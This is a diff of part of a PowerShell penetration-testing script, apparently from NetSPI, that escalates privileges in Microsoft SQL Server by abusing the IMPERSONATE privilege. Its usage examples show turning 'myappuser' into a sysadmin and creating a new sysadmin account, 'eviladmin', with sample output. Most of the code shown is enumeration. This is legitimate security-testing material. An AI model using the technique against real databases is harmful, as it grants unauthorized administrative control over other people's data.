@@ -9,47 +9,53 @@ function Invoke-MssqlEscalateExecuteAs
 {
     <#
 	.SYNOPSIS
-	   This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
+	This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
 
 	.DESCRIPTION
-	   This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
-       In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
-       privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
-       the existing user.  
-
-	.EXAMPLEa
-	   Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.
-
-	   PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
-	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
-	   [*] Connected.
-	   [*] Enumerating users that myappuser can impersonate...
-	   [*] 3 accounts can be impersonated.
-	   [*] - user2
-	   [*] - superuser
-	   [*] - sa
-	   [*] Checking if any of the users have the sysadmin role...
-	   [*] The sa account has the sysadmin role!
-	   [*] Attempting to evelate myappuser to sysadmin by impersonating the sa account...
-	   [*] Success! - myappuser is now a sysadmin.
-	   [*] All done.
+	This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
+	In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
+	privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
+	the existing user.  
 
 	.EXAMPLE
-	   Creating a new sysadmin as a user with permissions to impersonate the sa account.
+	Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.
 
-	   PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser evil admin -NewPass MyPassword!
-	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
-	   [*] Connected.
-	   [*] Enumerating users that myappuser can impersonate...
-	   [*] 3 accounts can be impersonated.
-	   [*] - user2
-	   [*] - superuser
-	   [*] - sa
-	   [*] Checking if any of the users have the sysadmin role...
-	   [*] The sa account has the sysadmin role!
-	   [*] Attempting to create the eviladmin sysadmin account by impersonating the sa account...
-	   [*] Success! - eviladmin is now a sysadmin.
-	   [*] All done.
+	PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
+	[*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
+	[*] Connected.
+	[*] Enumerating users that myappuser can impersonate...
+	[*] 3 accounts can be impersonated:
+	[*] - user2
+	[*] - superuser
+	[*] - sa
+	[*] Checking if any of are sysadmins...
+	[*] - user2 - NOT sysadmin
+	[*] - superuser - NOT sysadmin
+	[*] - sa - sysadmin!
+	[*] Attempting to add myappuser to the sysadmin role via impersonation...
+	[*] Verifying that myappuser was added to the sysadmin role...
+	[*] Success! - myappuser is now a sysadmin.
+	[*] All done.
+
+	.EXAMPLE
+	Creating a new sysadmin as a user with permissions to impersonate the sa account.
+
+	PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser eviladmin -NewPass MyPassword!
+	[*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
+	[*] Connected.
+	[*] Enumerating users that myappuser can impersonate...
+	[*] 3 accounts can be impersonated:
+	[*] - user2
+	[*] - superuser
+	[*] - sa
+	[*] Checking if any of are sysadmins...
+	[*] - user2 - NOT sysadmin
+	[*] - superuser - NOT sysadmin
+	[*] - sa - sysadmin!
+	[*] Attempting to create and add eviladmin to the sysadmin role via impersonation...
+	[*] Verifying that eviladmin was added to the sysadmin role...
+	[*] Success! - eviladmin is now a sysadmin.
+	[*] All done.
 
 	.LINK
 	   http://www.netspi.com
@@ -116,7 +122,7 @@ function Invoke-MssqlEscalateExecuteAs
      		
             Write-Output "[*] Attempting to authenticate to $SqlServerInstance with domain account $SqlUser..."
             $SqlServerInstanceCol = $SqlServerInstance -replace ',', ':'
-	        $CredManCmd = 'cmdkey /add:'+$SqlServerInstanceCol+' /user:'+$SqlUser+' /pass:'+$SqlPass 
+	    $CredManCmd = 'cmdkey /add:'+$SqlServerInstanceCol+' /user:'+$SqlUser+' /pass:'+$SqlPass 
             Write-Verbose "Command: $CredManCmd"
             $ExecManCmd = invoke-expression $CredManCmd
         }else{
@@ -221,12 +227,17 @@ function Invoke-MssqlEscalateExecuteAs
     # Check if any users can be impersonated
     if ($TableImpUsers.rows.count -eq 0){
 
-	    Write-Host "[*] Sorry, the current user doesn't have permissions to impersonate anyone." -foreground "red"
+	# Status user
+	Write-Host "[*] Sorry, the current user doesn't have permissions to impersonate anyone." -foreground "red"
         Write-Host "[*] All done." 
         break
     }else{
-	    $ImpUserCount = $TableImpUsers.rows.count      
-	    Write-Host "[*] Found $ImpUserCount users that can be impersonated:" 
+    	
+    	# Status user	
+	$ImpUserCount = $TableImpUsers.rows.count      
+	Write-Host "[*] Found $ImpUserCount users that can be impersonated:" 
+	
+	# Display users
         $TableImpUsers | foreach{
             $ImpUser = $_.name
             Write-Host "[*] - $ImpUser"
@@ -258,15 +269,15 @@ function Invoke-MssqlEscalateExecuteAs
             $Query = "select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status"
 
             # Execute query
-	        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
-	        $results = $cmd.ExecuteReader()             
+	    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+	    $results = $cmd.ExecuteReader()             
 
             # Parse query results
             $TableImpUserSysAdminsCheck = New-Object System.Data.DataTable 
             $TableImpUserSysAdminsCheck.Load($results)
 
             $TableImpUserSysAdminsCheck | foreach{
-                $SysAdminStatus = $_.status
+            $SysAdminStatus = $_.status
             }
             
             # Check if the impersonatable user is a sysadmin
